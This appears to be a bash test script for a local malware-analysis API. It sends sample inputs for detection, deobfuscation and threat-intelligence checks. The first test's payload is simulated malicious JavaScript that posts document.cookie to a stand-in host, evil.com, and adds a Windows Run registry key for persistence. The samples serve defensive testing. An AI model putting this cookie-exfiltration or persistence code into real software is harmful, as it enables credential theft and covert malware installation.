#!/bin/bash

API_URL="http://localhost:3000"
API_KEY="test-key-123"

echo "Testing WASM Analysis Pipeline..."
echo ""

# Test 1: Malware Pattern Detection
echo "Test 1: Malware Pattern Detection"
echo "=================================="
curl -s -X POST "${API_URL}/api/v1/analyze" \
  -H "Content-Type: application/json" \
  -H "X-API-Key: ${API_KEY}" \
  -d '{
    "content": "function maliciousCode() {\n  // Simulated malware patterns\n  const c2_server = \"http://evil.com/command\";\n  const stolen_data = document.cookie;\n  fetch(c2_server, { method: \"POST\", body: stolen_data });\n  \n  // Obfuscated code\n  eval(atob(\"YWxlcnQoXCJoYWNrZWRcIik\"));\n  \n  // Registry modification attempt\n  const wsh = new ActiveXObject(\"WScript.Shell\");\n  wsh.RegWrite(\"HKLM\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\\Malware\", \"malware.exe\");\n}",
    "analysisType": "MALWARE_ANALYSIS",
    "priority": "high",
    "metadata": {
      "fileType": "javascript",
      "source": "test-script"
    }
  }' | jq .

echo ""
echo "---"
echo ""

# Test 2: Simple code for deobfuscation
echo "Test 2: Code Analysis with WASM Preprocessing"
echo "============================================="
# Base64 encode some obfuscated JavaScript
OBFUSCATED_CODE=$(echo 'var _0x1234=["log","Hello","World"];(function(_0x5678,_0x9abc){var _0xdef0=function(_0x1111){while(--_0x1111){_0x5678["push"](_0x5678["shift"]());}};_0xdef0(++_0x9abc);}(_0x1234,0x123));var _0x5678=function(_0x9abc,_0xdef0){_0x9abc=_0x9abc-0x0;var _0x1111=_0x1234[_0x9abc];return _0x1111;};console[_0x5678("0x0")](_0x5678("0x1")+" "+_0x5678("0x2"));' | base64)

curl -s -X POST "${API_URL}/api/v1/analyze" \
  -H "Content-Type: application/json" \
  -H "X-API-Key: ${API_KEY}" \
  -d "{
    \"content\": \"${OBFUSCATED_CODE}\",
    \"analysisType\": \"CODE_DEOBFUSCATION\",
    \"metadata\": {
      \"encoding\": \"base64\",
      \"fileType\": \"javascript\"
    }
  }" | jq .

echo ""
echo "---"
echo ""

# Test 3: Network threat patterns
echo "Test 3: Network Threat Detection"
echo "================================"
curl -s -X POST "${API_URL}/api/v1/analyze" \
  -H "Content-Type: application/json" \
  -H "X-API-Key: ${API_KEY}" \
  -d '{
    "content": "Network capture analysis:\n- Suspicious DNS queries to: malware-c2.evil.com\n- HTTP POST to IP: 192.168.1.100:4444\n- Encrypted traffic on non-standard port 8888\n- Multiple connection attempts to TOR nodes\n- Data exfiltration pattern detected: 50MB uploaded to external server",
    "analysisType": "THREAT_INTELLIGENCE",
    "metadata": {
      "fileType": "network-log",
      "source": "packet-capture"
    }
  }' | jq .

echo ""
echo "---"
echo ""

# Test 4: Check WASM modules status
echo "Test 4: WASM Modules Status"
echo "==========================="
curl -s "${API_URL}/api/v1/status/wasm" | jq .